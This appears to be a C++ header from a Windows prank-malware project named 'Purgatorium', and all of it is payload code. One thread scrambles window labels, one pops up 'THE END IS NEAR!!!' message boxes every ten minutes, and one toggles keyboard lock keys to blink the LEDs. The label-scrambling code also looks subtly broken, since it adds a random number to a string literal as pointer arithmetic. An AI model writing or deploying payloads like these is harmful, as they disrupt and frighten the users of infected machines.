typedef struct IUnknown IUnknown;

#pragma once

#include "Purgatorium.h"

DWORD consent = 0x00000001;

namespace Payloads
{


	//Put random strings in windows labels
	DWORD WINAPI MessLabels(LPVOID lpvd)
	{
		while (true)
		{
			HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
			EnumChildWindows(hwnd, System::EnumChildProc, NULL);
		}
	}

	//Show a message each 10 minutes
	DWORD WINAPI TimedMessages(LPVOID lpvd)
	{
		while (true)
		{
			//10 minutes
			Sleep(1000 * 600);

			MessageBoxW(NULL, L"THE END IS NEAR!!!", L"THE END IS NEAR!!!", MB_OK | MB_ICONEXCLAMATION);
		}

		return 0x00;
	}

	//Blink the LEDs of your keyboard
	DWORD WINAPI KeyboardPayload(LPVOID lpvd)
	{
		while (true)
		{
			System::PressKey(VK_CAPITAL, 1000);
			System::PressKey(VK_SCROLL,  1000);
		}

		return 0x00;
	}

	
}

